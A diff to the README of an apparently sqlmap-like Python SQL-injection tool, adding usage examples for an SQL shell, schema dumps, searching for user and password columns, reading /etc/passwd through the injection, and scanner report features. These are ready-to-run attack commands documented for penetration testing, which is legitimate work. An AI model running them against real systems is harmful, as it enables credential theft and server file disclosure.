@@ -36,9 +36,26 @@ python3 pymap.py -u "http://target/page?id=1" -D shopdb -T users --dump
 # arbitrary scalar query
 python3 pymap.py -u "http://target/page?id=1" --sql-query "SELECT password FROM users LIMIT 1"
 
-# POST body, cookies, tamper chains, PoC generator
+# interactive SQL shell through the injection
+python3 pymap.py -u "http://target/page?id=1" --sql-shell
+
+# full schema dump: database -> tables -> columns
+python3 pymap.py -u "http://target/page?id=1" --schema --exclude-sysdbs
+
+# search table names / column names across all databases
+python3 pymap.py -u "http://target/page?id=1" --search -T "%user%"
+python3 pymap.py -u "http://target/page?id=1" --search -C "%pass%"
+
+# read a server-side file (MySQL LOAD_FILE / PostgreSQL pg_read_file)
+python3 pymap.py -u "http://target/page?id=1" --file-read /etc/passwd
+
+# wizard mode (no -u needed): asks target + action interactively
+python3 pymap.py
+
+# POST body, cookies, tamper chains, PoC generator, param exclusion
 python3 pymap.py -u "http://target/login" --data "user=a&pass=b" --technique=BT
 python3 pymap.py -u "http://target/page?id=1" --level 2 --cookie "uid=1"
+python3 pymap.py -u "http://target/page?id=1&debug=1" --exclude-param debug
 python3 pymap.py -u "http://target/page?id=1" --tamper=space2comment,randomcase --gen-poc
 ```
 
@@ -87,7 +104,13 @@ Enter target URL (or 'quit'):
 ```
 
 Loops until you type `quit`. Every request is logged to `pyscan-output/evidence.jsonl`,
-findings to `pyscan-output/report.json`. `http://` is added automatically if omitted.
+findings to `pyscan-output/report.json` + `report.html`. `http://` is added automatically.
+
+Scanner extras:
+- **CSRF-aware crawling**: hidden form fields (CSRF tokens) keep their real values so
+  forms submit validly, but CSRF-like params are auto-skipped during testing
+  (`--test-all-params` disables the skip, `--exclude-param a,b` skips custom names).
+- **HTML report** (`report.html`): self-contained dark-theme findings table.
 
 ### Command-line mode
 
